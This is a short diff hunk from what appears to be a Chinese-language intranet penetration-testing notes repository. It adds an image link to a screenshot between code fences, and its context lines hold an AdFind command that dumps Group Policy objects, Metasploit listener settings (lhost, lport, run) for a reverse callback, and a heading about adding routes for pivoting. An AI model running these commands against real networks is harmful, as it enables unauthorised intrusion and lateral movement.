@@ -441,6 +441,10 @@ AdFind -sc gpodmp
   set lhost 192.168.101.66
   set lport 1234
   run
+  ```
+  ![image](https://github.com/JohnnyZhouX/Hack_For_Intranet/blob/main/pic/%E6%8D%95%E8%8E%B72.PNG)
+  
+  ```
   
   添加路由：
   查看路由 
